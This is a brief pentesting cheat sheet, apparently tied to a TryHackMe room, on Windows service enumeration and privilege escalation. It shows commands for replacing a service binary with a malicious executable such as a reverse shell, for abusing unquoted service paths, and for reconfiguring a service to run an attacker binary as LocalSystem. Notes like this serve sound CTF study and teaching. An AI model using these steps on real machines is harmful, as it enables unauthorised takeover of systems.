# Windows services

[Go back](../index.md#windows-privilege-escalation-)

[![steelmountain](../../../_badges/thmp-p/steelmountain.svg)](https://tryhackme.com/room/steelmountain)

<div class="row row-cols-md-2"><div>

**Warning ⚠️: `sc` must be replaced by `sc.exe` in PowerShell.**

Windows services are managed by the Service Control Manager <small>(SCM)</small>.

* 🗺️ List services

```shell!
PS> Get-Service
PS> net start
CMD> sc query # with infos
```

* 🔎 Get more info about a service

```shell!
CMD> sc qc xxx
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: xxx
  [...]
  BINARY_PATH_NAME   : C:\[...]\service.exe
  [...]
```

🔥 In CTFs, you may be able to start/stop the service manually

```shell!
PS> sc.exe stop xxx
PS> # do your job
PS> sc.exe start xxx
```

</div><div>

#### Common flaws

➡️ **Insecure permissions**: the current user may be able to replace the service with a malicious executable (ex: revshell.exe)

```shell!
PS> icacls C:\[...]\service.exe
PS> move C:\[...]\service.exe C:\[...]\service.exe.old
PS> icacls C:\[...]\malicious.exe /grant Everyone:F
```

➡️ **Unquoted Service Paths**: if the service is using a PATH in which there are spaces, the service isn't quoted, and the hacker can create files, then the hacker may create an executable that is executed with the rest of the path in argument.

```shell!
PS> icacls $Env:appdata\Vulnerable Program\service.exe
PS> move C:\[...]\malicious.exe $Env:appdata\Vulnerable.exe
PS> # the service will execute
PS> # $Env:appdata\Vulnerable.exe Program\service.exe
```

➡️ **Insecure Service Permissions**: it occurs if we can edit the permissions of a service, such as being able to change the location of the binary. Use the [accesschk](https://learn.microsoft.com/en-us/sysinternals/downloads/accesschk) command. If the user is granted `SERVICE_ALL_ACCESS` on the service, then have fun.

```shell!
PS> # LocalSystem is the highest privileged account available
PS> sc.exe config xxx binPath=C:\[...]\malicious.exe  obj= LocalSystem
```
</div></div>